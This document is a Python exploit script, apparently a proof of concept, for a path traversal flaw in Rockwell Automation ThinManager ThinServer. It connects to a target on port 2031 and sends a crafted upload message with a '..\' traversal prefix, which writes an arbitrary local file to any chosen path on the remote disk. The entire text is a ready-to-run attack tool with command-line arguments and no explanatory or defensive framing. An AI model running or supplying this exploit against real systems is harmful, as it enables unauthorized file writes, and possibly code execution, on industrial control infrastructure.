import socket, argparse, hexdump
from struct import *

def dump(title, data):
  print('[-- %s --]' % (title))
  if data: hexdump.hexdump(data)

def mk_msg(type, flags, data, dlen=None):
  if dlen == None:
    dlen = len(data)
  hdr = pack('>HHL', type, flags, dlen);
  msg = hdr + data
  return msg


#
# MAIN
#
descr = 'Rockwell Automation ThinManager ThinServer Path Traversal (File Upload)'

parser = argparse.ArgumentParser(description=descr, formatter_class=argparse.RawTextHelpFormatter)
required = parser.add_argument_group('required arguments')
required.add_argument('-t', '--target',required=True, help='target host')
required.add_argument('-f', '--file',required=True, help='local file to upload')
required.add_argument('-n', '--fname',required=True, help='file name to be saved as, relative to the root directory on the disk drive where ThinManager is installed')
parser.add_argument('-p', '--port', type=int, default=2031, help='ThinServer.exe port, default: %(default)s')

args = parser.parse_args()
target = args.target
port = args.port
file = args.file
fname = args.fname

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.settimeout(5)

with open(file,'rb') as f: fdata = f.read()

req = pack('<L', 0x100);
dump('req', req)
s.sendall(req)
res = s.recv(4096)
dump('res', res)

data  = pack('>L', 0xaa)
data += ('..\..\..\..\..\..\..\..\..\\' + fname).encode() + b'\x00'
data += b'file_type\x00'
data += b'unk_str1\x00'
data += pack('>L', len(fdata))
data += fdata
 
req = mk_msg(7, 0x0001, data)
print('Uploading local file {} as {} on the remote host.'.format(file, fname))
print('Please check if the file has been uploaded.');

s.sendall(req)
try:
  res = s.recv(4096)
  dump('res', res)
except: pass

s.close()
